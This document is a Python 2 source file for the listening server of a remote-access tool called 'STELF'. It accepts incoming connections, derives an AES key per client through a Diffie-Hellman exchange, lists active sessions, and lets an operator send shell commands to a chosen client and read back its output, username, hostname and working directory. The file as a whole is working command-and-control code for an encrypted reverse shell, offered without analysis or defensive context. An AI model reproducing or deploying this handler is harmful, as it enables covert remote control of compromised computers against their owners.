#!/usr/bin/env python2
import socket, sys, json, base64, random, hashlib, signal, threading, time
from Crypto.Cipher import AES

class Client:
	def __init__(self, id, socket, address, port, key, IV):
		self.id = id
		
		self.sock = socket
		self.address = address
		self.port = port
		
		self.enc_key = key
		self.enc_IV = IV
		
		self.aes_obj = AES.new(self.enc_key, AES.MODE_CFB, self.enc_IV)
		
		self.cwd = "STELF Connected "
		self.prompt = self.cwd + ">>"
		
	def encrypt(self, data):
		return base64.b64encode(self.aes_obj.encrypt(data))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(base64.b64decode(data))
		
	def send(self, data):
		self.sock.sendall(self.encrypt(data))
		
	def recv(self):
		data = self.sock.recv(4096)		
		if not data: raise Exception("[-] Client Disconnected")
				
		return self.decrypt(data)
		
	def make_prompt(self, data_package):
		if data_package["username"] and data_package["hostname"]:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + "@" +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">>"

		else:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + " " +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">>"
							
		self.prompt = self.prompt.strip()
		
	def interact(self):
		print "starting interaction"
		while True:
			try:
				user_input = raw_input("\n" + self.prompt + " ")
			except KeyboardInterrupt: break
			if user_input == "help":
				print "Available commands:\n prompt - change prompt"
			else:
				try:
					self.send(user_input)
					
					data = self.recv()
				
					data_package = json.loads(data)
					for key in data_package:
						data_package[key] = base64.b64decode(data_package[key])
			
					self.make_prompt(data_package)
			
					sys.stdout.write(data_package["data"])
				
				except Exception as e:
						print "Something went wrong" 
						print e
						break
		

		
class Handler:
	def __init__(self, bind, port):
		self.bind = bind
		self.port = port
				
		self.cwd = "STELF Connected "
		self.prompt = self.cwd + ">>"
		self.server_sock = socket.socket()
		self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		self.server_sock.bind((self.bind, self.port))
		self.server_sock.listen(5)

		self.commands = []
		
		self.clients = []
		#signal.signal(signal.SIGINT, self.signal_handler)

	def gen_diffie_key(self, client):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		client_key = client.recv(4096)
		client.sendall(str(public_key))
		
		sharedSecret = pow(int(client_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		return key, IV
		
	  
	def signal_handler(self, signal, frame):
		print "\n\rBye Bye!"
		self.server_sock.close()
		sys.exit(0)

	#def send_cmd(self, command):
	#	self.commands.append(command)
	#	self.client_socket.sendall(self.encrypt(command))
		
	def accept_clients(self):
		while True:
			client, addr = self.server_sock.accept()
			key, IV = self.gen_diffie_key(client)

			c = Client(len(self.clients), client, addr[0], addr[1], key, IV)
			self.clients.append(c)
			
	def start(self):
		print "start"
		t = threading.Thread(target=self.accept_clients)
		t.daemon = True
		t.start()
		while True:
			try:
				user_input = raw_input("handler>> ")
			except KeyboardInterrupt: sys.exit("\n[*]User requested shutdown.")
			if user_input == "list":
				print "Current active sessions:"
				print "========================"
				for c in self.clients:
					print "["+str(c.id)+"]: " + c.address + ":" + str(c.port)
					
				print"\n========================"
					
			elif user_input.startswith("interact"):
				try:
					req_id = int(user_input.split()[1])
					self.clients[req_id].interact()
				except Exception as e:
					print e


	# def interface(self):
		# print "[*] Connection established! "
		# while True:
			# user_input = raw_input("\n" + self.prompt + " ")
			# if user_input == "help":
				# print "Available commands:\n prompt - change prompt"
			# else:
				# try:
					# self.send_cmd(user_input)
					# data = self.client_socket.recv(4096)		
					# if not data: raise Exception("[-] Client Disconnected")
				
					# data = self.decrypt(data)
				
					# data_package = json.loads(data)
					# for key in data_package:
						# data_package[key] = base64.b64decode(data_package[key])
			
					# self.make_prompt(data_package)
			
					# sys.stdout.write(data_package["data"])
				
				# except Exception as e:
						# print "Something went wrong" 
						# print "[-] Broken pipe..."
						# print "[*] Attempting reconnection"
						# break

							
handler = Handler("0.0.0.0", 8080)
handler.start()
